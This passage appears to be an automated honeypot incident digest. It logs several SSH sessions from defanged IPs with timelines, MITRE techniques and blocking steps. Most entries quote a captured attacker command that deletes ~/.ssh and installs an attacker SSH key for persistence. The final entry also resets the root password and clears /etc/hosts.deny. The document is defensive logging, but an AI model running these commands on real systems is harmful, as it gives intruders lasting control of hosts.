| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:40:24` | `cowrie.session.connect` |
| `2026-06-02 22:40:24` | `cowrie.client.version` |
| `2026-06-02 22:40:24` | `cowrie.client.kex` |
| `2026-06-02 22:40:25` | `cowrie.login.success` |
| `2026-06-02 22:40:25` | `cowrie.session.params` |
| `2026-06-02 22:40:25` | `cowrie.command.input` |
| `2026-06-02 22:40:25` | `cowrie.command.failed` |
| `2026-06-02 22:40:26` | `cowrie.log.closed` |
| `2026-06-02 22:40:26` | `cowrie.session.params` |
| `2026-06-02 22:40:26` | `cowrie.command.input` |
| `2026-06-02 22:40:26` | `cowrie.session.file_download` |
| `2026-06-02 22:40:26` | `cowrie.log.closed` |
| `2026-06-02 22:40:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.29[.]151` to AbuseIPDB if not already reported
- [ ] Block `87.106.29[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca0a15ab687f

| Field | Detail |
|---|---|
| **Source IP** | `87.106.29[.]151` |
| **First Seen** | 2026-06-02 22:40 |
| **Last Seen** | 2026-06-02 22:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:40:28` | `cowrie.session.connect` |
| `2026-06-02 22:40:28` | `cowrie.client.version` |
| `2026-06-02 22:40:28` | `cowrie.client.kex` |
| `2026-06-02 22:40:29` | `cowrie.login.success` |
| `2026-06-02 22:40:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.29[.]151` to AbuseIPDB if not already reported
- [ ] Block `87.106.29[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e792f0097d97

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 22:42 |
| **Last Seen** | 2026-06-02 22:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:42:33` | `cowrie.session.connect` |
| `2026-06-02 22:42:33` | `cowrie.client.version` |
| `2026-06-02 22:42:33` | `cowrie.client.kex` |
| `2026-06-02 22:42:33` | `cowrie.login.success` |
| `2026-06-02 22:42:33` | `cowrie.session.params` |
| `2026-06-02 22:42:33` | `cowrie.command.input` |
| `2026-06-02 22:42:33` | `cowrie.command.failed` |
| `2026-06-02 22:42:34` | `cowrie.log.closed` |
| `2026-06-02 22:42:34` | `cowrie.session.params` |
| `2026-06-02 22:42:34` | `cowrie.command.input` |
| `2026-06-02 22:42:34` | `cowrie.session.file_download` |
| `2026-06-02 22:42:34` | `cowrie.log.closed` |
| `2026-06-02 22:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e836bb962935

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 22:42 |
| **Last Seen** | 2026-06-02 22:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:42:35` | `cowrie.session.connect` |
| `2026-06-02 22:42:35` | `cowrie.client.version` |
| `2026-06-02 22:42:35` | `cowrie.client.kex` |
| `2026-06-02 22:42:35` | `cowrie.login.success` |
| `2026-06-02 22:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56d28b718b5c

| Field | Detail |
|---|---|
| **Source IP** | `143.64.168[.]136` |
| **First Seen** | 2026-06-02 22:43 |
| **Last Seen** | 2026-06-02 22:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:43:38` | `cowrie.session.connect` |
| `2026-06-02 22:43:38` | `cowrie.client.version` |
| `2026-06-02 22:43:38` | `cowrie.client.kex` |
| `2026-06-02 22:43:39` | `cowrie.login.success` |
| `2026-06-02 22:43:39` | `cowrie.session.params` |
| `2026-06-02 22:43:39` | `cowrie.command.input` |
| `2026-06-02 22:43:39` | `cowrie.command.failed` |
| `2026-06-02 22:43:39` | `cowrie.log.closed` |
| `2026-06-02 22:43:40` | `cowrie.session.params` |
| `2026-06-02 22:43:40` | `cowrie.command.input` |
| `2026-06-02 22:43:40` | `cowrie.session.file_download` |
| `2026-06-02 22:43:40` | `cowrie.log.closed` |
| `2026-06-02 22:43:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.64.168[.]136` to AbuseIPDB if not already reported
- [ ] Block `143.64.168[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2e2d29c7505

| Field | Detail |
|---|---|
| **Source IP** | `87.106.29[.]151` |
| **First Seen** | 2026-06-02 22:43 |
| **Last Seen** | 2026-06-02 22:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:43:39` | `cowrie.session.connect` |
| `2026-06-02 22:43:39` | `cowrie.client.version` |
| `2026-06-02 22:43:40` | `cowrie.client.kex` |
| `2026-06-02 22:43:40` | `cowrie.login.success` |
| `2026-06-02 22:43:41` | `cowrie.session.params` |
| `2026-06-02 22:43:41` | `cowrie.command.input` |
| `2026-06-02 22:43:41` | `cowrie.command.failed` |
| `2026-06-02 22:43:41` | `cowrie.log.closed` |
| `2026-06-02 22:43:41` | `cowrie.session.params` |
| `2026-06-02 22:43:41` | `cowrie.command.input` |
| `2026-06-02 22:43:41` | `cowrie.session.file_download` |
| `2026-06-02 22:43:41` | `cowrie.log.closed` |
| `2026-06-02 22:43:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.29[.]151` to AbuseIPDB if not already reported
- [ ] Block `87.106.29[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de7471a83cb4

| Field | Detail |
|---|---|
| **Source IP** | `87.106.29[.]151` |
| **First Seen** | 2026-06-02 22:43 |
| **Last Seen** | 2026-06-02 22:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:43:43` | `cowrie.session.connect` |
| `2026-06-02 22:43:43` | `cowrie.client.version` |
| `2026-06-02 22:43:43` | `cowrie.client.kex` |
| `2026-06-02 22:43:44` | `cowrie.login.success` |
| `2026-06-02 22:43:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.29[.]151` to AbuseIPDB if not already reported
- [ ] Block `87.106.29[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-623151962193

| Field | Detail |
|---|---|
| **Source IP** | `143.64.168[.]136` |
| **First Seen** | 2026-06-02 22:43 |
| **Last Seen** | 2026-06-02 22:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:43:47` | `cowrie.session.connect` |
| `2026-06-02 22:43:47` | `cowrie.client.version` |
| `2026-06-02 22:43:47` | `cowrie.client.kex` |
| `2026-06-02 22:43:47` | `cowrie.login.success` |
| `2026-06-02 22:43:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.64.168[.]136` to AbuseIPDB if not already reported
- [ ] Block `143.64.168[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e113b85f997

| Field | Detail |
|---|---|
| **Source IP** | `87.106.29[.]151` |
| **First Seen** | 2026-06-02 22:45 |
| **Last Seen** | 2026-06-02 22:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:45:22` | `cowrie.session.connect` |
| `2026-06-02 22:45:22` | `cowrie.client.version` |
| `2026-06-02 22:45:22` | `cowrie.client.kex` |
| `2026-06-02 22:45:23` | `cowrie.login.success` |
| `2026-06-02 22:45:23` | `cowrie.session.params` |
| `2026-06-02 22:45:23` | `cowrie.command.input` |
| `2026-06-02 22:45:23` | `cowrie.command.failed` |
| `2026-06-02 22:45:24` | `cowrie.log.closed` |
| `2026-06-02 22:45:24` | `cowrie.session.params` |
| `2026-06-02 22:45:24` | `cowrie.command.input` |
| `2026-06-02 22:45:24` | `cowrie.session.file_download` |
| `2026-06-02 22:45:24` | `cowrie.log.closed` |
| `2026-06-02 22:45:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.29[.]151` to AbuseIPDB if not already reported
- [ ] Block `87.106.29[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55ac7bac7c9f

| Field | Detail |
|---|---|
| **Source IP** | `87.106.29[.]151` |
| **First Seen** | 2026-06-02 22:45 |
| **Last Seen** | 2026-06-02 22:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:45:26` | `cowrie.session.connect` |
| `2026-06-02 22:45:26` | `cowrie.client.version` |
| `2026-06-02 22:45:26` | `cowrie.client.kex` |
| `2026-06-02 22:45:27` | `cowrie.login.success` |
| `2026-06-02 22:45:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.29[.]151` to AbuseIPDB if not already reported
- [ ] Block `87.106.29[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-539f0416d071

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 22:45 |
| **Last Seen** | 2026-06-02 22:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:45:43` | `cowrie.session.connect` |
| `2026-06-02 22:45:43` | `cowrie.client.version` |
| `2026-06-02 22:45:43` | `cowrie.client.kex` |
| `2026-06-02 22:45:44` | `cowrie.login.success` |
| `2026-06-02 22:45:44` | `cowrie.session.params` |
| `2026-06-02 22:45:44` | `cowrie.command.input` |
| `2026-06-02 22:45:44` | `cowrie.command.failed` |
| `2026-06-02 22:45:44` | `cowrie.log.closed` |
| `2026-06-02 22:45:45` | `cowrie.session.params` |
| `2026-06-02 22:45:45` | `cowrie.command.input` |
| `2026-06-02 22:45:45` | `cowrie.session.file_download` |
| `2026-06-02 22:45:45` | `cowrie.log.closed` |
| `2026-06-02 22:45:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5756d00823d7

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 22:45 |
| **Last Seen** | 2026-06-02 22:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:45:47` | `cowrie.session.connect` |
| `2026-06-02 22:45:47` | `cowrie.client.version` |
| `2026-06-02 22:45:47` | `cowrie.client.kex` |
| `2026-06-02 22:45:48` | `cowrie.login.success` |
| `2026-06-02 22:45:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37fb4feff78d

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-06-02 22:47 |
| **Last Seen** | 2026-06-02 22:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:47:14` | `cowrie.session.connect` |
| `2026-06-02 22:47:14` | `cowrie.client.version` |
| `2026-06-02 22:47:14` | `cowrie.client.kex` |
| `2026-06-02 22:47:14` | `cowrie.login.success` |
| `2026-06-02 22:47:15` | `cowrie.session.params` |
| `2026-06-02 22:47:15` | `cowrie.command.input` |
| `2026-06-02 22:47:15` | `cowrie.command.failed` |
| `2026-06-02 22:47:15` | `cowrie.log.closed` |
| `2026-06-02 22:47:15` | `cowrie.session.params` |
| `2026-06-02 22:47:15` | `cowrie.command.input` |
| `2026-06-02 22:47:15` | `cowrie.session.file_download` |
| `2026-06-02 22:47:15` | `cowrie.log.closed` |
| `2026-06-02 22:47:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a407b6241e9

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-06-02 22:47 |
| **Last Seen** | 2026-06-02 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:47:17` | `cowrie.session.connect` |
| `2026-06-02 22:47:17` | `cowrie.client.version` |
| `2026-06-02 22:47:17` | `cowrie.client.kex` |
| `2026-06-02 22:47:18` | `cowrie.login.success` |
| `2026-06-02 22:47:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d39f2eea4f1f

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 22:48 |
| **Last Seen** | 2026-06-02 22:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:48:50` | `cowrie.session.connect` |
| `2026-06-02 22:48:50` | `cowrie.client.version` |
| `2026-06-02 22:48:50` | `cowrie.client.kex` |
| `2026-06-02 22:48:51` | `cowrie.login.success` |
| `2026-06-02 22:48:51` | `cowrie.session.params` |
| `2026-06-02 22:48:51` | `cowrie.command.input` |
| `2026-06-02 22:48:51` | `cowrie.command.failed` |
| `2026-06-02 22:48:52` | `cowrie.log.closed` |
| `2026-06-02 22:48:52` | `cowrie.session.params` |
| `2026-06-02 22:48:52` | `cowrie.command.input` |
| `2026-06-02 22:48:52` | `cowrie.session.file_download` |
| `2026-06-02 22:48:52` | `cowrie.log.closed` |
| `2026-06-02 22:48:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a1bcdf75377

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 22:48 |
| **Last Seen** | 2026-06-02 22:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:48:54` | `cowrie.session.connect` |
| `2026-06-02 22:48:54` | `cowrie.client.version` |
| `2026-06-02 22:48:55` | `cowrie.client.kex` |
| `2026-06-02 22:48:55` | `cowrie.login.success` |
| `2026-06-02 22:48:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5acfd760859d

| Field | Detail |
|---|---|
| **Source IP** | `143.64.168[.]136` |
| **First Seen** | 2026-06-02 22:48 |
| **Last Seen** | 2026-06-02 22:49 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:25qRNOoLMr5x"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
